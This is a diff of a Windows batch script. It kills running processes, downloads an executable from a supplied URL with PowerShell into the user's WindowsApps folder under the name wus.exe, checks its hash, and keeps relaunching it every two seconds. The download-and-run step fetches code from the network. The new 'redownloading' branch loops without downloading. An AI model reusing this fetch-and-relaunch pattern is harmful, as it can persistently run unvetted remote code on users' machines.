@@ -4,15 +4,16 @@ setlocal enabledelayedexpansion
 set "exe_path=%localappdata%\Microsoft\WindowsApps\wus.exe"
 set "hash_url=https://github.com/KSGVIO/dist/raw/refs/heads/main/wus.hash"
 
+:main_loop
 :: Kill existing processes
 taskkill /F /IM wus.exe >nul 2>&1
 taskkill /F /IM flask_server.exe >nul 2>&1
 
-:: Delete old exe
-del /f /q "%exe_path%"
+:: Delete old exe if exists
+if exist "%exe_path%" del /f /q "%exe_path%"
 
 :download_loop
-:: Download executable
+echo Downloading executable...
 powershell -command "iwr -Uri %1 -OutFile '%exe_path%'"
 
 :: Download hash file
@@ -27,35 +28,26 @@ set /p "expected_hash=" < "%hash_file%"
 
 :: Compare hashes
 if /i "!calculated_hash!"=="!expected_hash!" (
-    :: Hash matches, run exe
-    "%exe_path%"
+    echo Hash verified.
 ) else (
     echo Hash mismatch! Redownloading...
     timeout /t 2 >nul
     goto download_loop
 )
 
-:: Wait and check if process is running
-timeout /t 30 /nobreak >nul
-tasklist | find "wus" >nul
-if %errorlevel%==0 (
-    exit
-) else (
-   if exist "%exe_path%" (
-      "%exe_path%"
-   ) else (
-      goto download_loop
-   )
-)
-timeout /t 30 /nobreak >nul
-tasklist | find "wus" >nul
-if %errorlevel%==0 (
-    exit
-) else (
-   if exist "%exe_path%" (
-      "%exe_path%"
-   ) else (
-      goto download_loop
-   )
+:run_check_loop
+:: Check if process is running
+tasklist | find /i "wus.exe" >nul
+if errorlevel 1 (
+    if exist "%exe_path%" (
+        echo Launching executable...
+        start "" "%exe_path%"
+    ) else (
+        echo Executable missing, redownloading...
+        goto run_check_loop
+    )
 )
 
+:: Wait before next check
+timeout /t 2 >nul
+goto run_check_loop
